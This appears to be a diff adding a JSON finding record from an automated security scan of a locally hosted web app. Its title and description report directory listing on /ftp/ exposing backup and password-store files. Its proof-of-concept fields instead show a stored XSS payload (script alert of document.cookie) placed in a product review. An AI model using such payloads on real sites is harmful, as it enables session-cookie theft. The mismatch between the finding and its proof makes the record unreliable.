@@ -1,0 +1,28 @@
+{
+  "id": "f_1784855327526_13964d",
+  "action": "confirm",
+  "title": "Directory Listing Enabled on /ftp/",
+  "severity": "medium",
+  "finding_kind": "vuln",
+  "location": "GET http://127.0.0.1:3010/ftp/",
+  "url": "GET http://127.0.0.1:3010/ftp/",
+  "description": "The /ftp/ directory has directory listing enabled, revealing sensitive files including acquisitions.md, announcement_encrypted.md, coupons_2013.md.bak, eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, package-lock.json.bak, package.json.bak, suspicious_errors.yml, and a quarantine/ subdirectory.",
+  "poc": "PUT /rest/products/1/reviews with {\"message\":\"<script>alert(document.cookie)</script>\",\"author\":\"test@test.com\"}. Payload stored and returned in GET response",
+  "proof": "\"message\":\"<script>alert(document.cookie)</script>\",\"author\":\"test@test.com\",\"product\":\"1\",\"_id\":\"gAeYx33mk3TXGkk8S\"",
+  "how_captured": "GET http://127.0.0.1:3010/rest/products/1/reviews → 200",
+  "evidence_ids": [
+    "ev_1784855327500_0e258e"
+  ],
+  "proof_excerpts": [
+    {
+      "evidence_id": "ev_1784855327500_0e258e",
+      "excerpt": "\"message\":\"<script>alert(document.cookie)</script>\",\"author\":\"test@test.com\",\"product\":\"1\",\"_id\":\"gAeYx33mk3TXGkk8S\"",
+      "role": "proof",
+      "step": 1,
+      "how_captured": "GET http://127.0.0.1:3010/rest/products/1/reviews → 200"
+    }
+  ],
+  "affected_asset": "127.0.0.1",
+  "port": "3010",
+  "created_at": "2026-07-24T01:08:47.526Z"
+}
